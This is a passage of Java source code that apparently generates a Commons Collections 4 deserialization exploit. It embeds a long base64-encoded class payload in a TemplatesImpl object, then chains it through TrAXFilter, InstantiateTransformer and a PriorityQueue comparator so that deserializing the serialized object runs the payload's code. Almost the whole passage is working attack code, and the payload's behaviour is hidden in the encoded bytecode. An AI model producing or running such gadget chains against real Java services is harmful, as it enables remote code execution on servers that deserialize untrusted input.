HAAAAVwADAAQAAAALKyy4ATArLbYBNbEAAAACABkAAAAKAAIAAACFAAoAhgAaAAAAKgAEAAAACwAgACEAAAAAAAsBKgAcAAEAAAALASsA4AACAAAACwEsABwAAwALAAAABAABABgACADPAFIAAgAHAAAAVwACAAMAAAARKiu4ATBNLAS2ATosKrYBPLAAAAACABkAAAAOAAMAAACJAAYAigALAIsAGgAAACAAAwAAABEBNgAcAAAAAAARATcA4AABAAYACwE4ATkAAgALAAAABAABABgACAEtAS4AAgAHAAAAxwADAAQAAAAoKrYAhE0sxgAZLCu2AUNOLQS2ATotsE4stgFGTaf/6bsBPlkrtwFHvwABAAkAFQAWAT4ABAAZAAAAJgAJAAAAjwAFAJAACQCSAA8AkwAUAJQAFgCVABcAlgAcAJcAHwCZABoAAAA0AAUADwAHATgBOQADABcABQB5AT8AAwAAACgBNgAcAAAAAAAoATcA4AABAAUAIwB3AHgAAgAiAAAADAABAAUAIwB3APYAAgAoAAAADQAD/AAFBwCGUAcBPggACwAAAAQAAQE+ACgAUQBSAAIABwAAAEIABAACAAAADiorA70AhgO9AAS4AN6wAAAAAgAZAAAABgABAAAAngAaAAAAFgACAAAADgFIABwAAAAAAA4BSQDgAAEACwAAAAgAAwBsAGoAbgApAFEA3AACAAcAAAIXAAMACQAAAMoqwQCGmQAKKsAAhqcAByq2AIQ6BAE6BRkEOgYZBccAZBkGxgBfLMcAQxkGtgFYOgcDNggVCBkHvqIALhkHFQgytgFZK7YBXJkAGRkHFQgytgFgvpoADRkHFQgyOgWnAAmECAGn/9CnAAwZBisstgCjOgWn/6k6BxkGtgFGOgan/50ZBccADLsAbFkrtwFhvxkFBLYAqSrBAIaZABoZBQEttgCxsDoHuwFjWRkHtgFmtwFnvxkFKi22ALGwOge7AWNZGQe2AWa3AWe/AAMAJQByAHUAbACcAKMApABqALMAugC7AGoAAwAZAAAAbgAbAAAAogAUAKMAFwClABsApgAlAKgAKQCqADAAqwA7AKwAVgCtAF0ArgBgAKsAZgCxAGkAsgByALYAdQC0AHcAtQB+ALYAgQC4AIYAuQCPALsAlQC8AJwAvgCkAL8ApgDAALMAxAC7AMUAvQDGABoAAAB6AAwAMwAzAEUARgAIADAANgFKAUsABwB3AAcAeQFMAAcApgANAHkBTQAHAL0ADQB5AU0ABwAAAMoBNgAcAAAAAADKAUkA4AABAAAAygFOAU8AAgAAAMoBUAFRAAMAFAC2AHcAeAAEABcAswFSAHYABQAbAK8BUwB4AAYAKAAAAC8ADg5DBwCG/gAIBwCGBwClBwCG/QAXBwFUASz5AAUCCEIHAGwLDVQHAGoORwcAagALAAAACAADAGwAbgBqAAgBaAAWAAEABwAAACUAAgAAAAAACbsAAlm3AWlXsQAAAAEAGQAAAAoAAgAAABoACAAbAAA=";
        b64.encodeObj(cc4Demo(b64Str));

        // 反序列化
//        byte[] bytes = Base64.getDecoder().decode(base64Str);
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
//        objectInputStream.readObject();
    }

    public String make(Class<?> clazz) throws Exception {
        B64 b64 = new B64();
        return b64.encodeObj(cc4Demo(b64.encodeJavaClass(clazz)));
    }

    public static class Foo implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }
    public static Object cc4Demo(String base64Payload) throws Exception {
        byte[] bytes = java.util.Base64.getDecoder().decode(base64Payload);
        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl templates = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{bytes, ClassFiles.classAsBytes(Foo.class)});
        Reflections.setFieldValue(templates, "_name", "anystr");
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_tfactory", new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());


        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates})};

        // create queue with numbers
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformerChain));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return queue;
    }
}
